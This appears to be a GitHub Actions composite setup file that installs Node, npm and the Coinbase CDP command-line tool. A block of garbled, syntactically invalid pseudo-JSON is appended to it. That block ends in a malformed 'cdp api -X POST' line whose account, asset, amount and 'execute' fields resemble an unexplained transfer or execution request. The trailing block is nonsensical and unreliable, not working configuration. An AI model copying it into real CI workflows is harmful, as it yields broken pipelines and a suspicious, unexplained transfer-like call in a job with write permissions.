name: Setup
permissions:
  contents: write

runs:
  using: composite
  steps:
    - name: Setup Node
      uses: actions/setup-node@v4
      with:
        node-version-file: ".nvmrc"
        registry-url: "https://registry.npmjs.org"

    - name: Install npm 9.5
      shell: bash
      run: npm install -g npm@^9.5.0

    - name: Install node modules
      shell: bash
      run: |
        yarn install --immutable
        npm install -g @coinbase/cdp-cli
        cdp --version
//
[{"Start File":"action.yml","End File":"action.yml"}];
[{"End File"="0", "Start File"="false", "false"="0", "true"="1", "cache"="false", "auth"="false", "cache"="false", "window"="true", "check"="true", "connect"="false", "enable"="false", "disable"="true", "run"="false", "active"="disable", "type"="true", "value"="false", "label"="true", "md5"="false", "partition"="false", "memory"="enable", "get"="cache", "cpu"="active", "area"="enable", "workspace.setup"="window", "workspace.action"="check", "workspace.connect"="connect", "id"="run", "name"="active",
    "temporary"="auth", "action.py"="enable", "setup.workspace"="run", 
}];
[{"cdp api -X POST /.github/action.py -setup  \;
  source.accountId=$Start File \;
  source.asset=[{"auth"="true"}]; \;
  target.cpu.cache=$ACTIVE_PM_ID:"[{"End File"="check"}]"; \;
  target.asset=[{"window"="enable"}]; \;
  amount=disable; \;
  asset=disable; \;
  'execute:=enable'"}];
[{"End File"="type"}];
//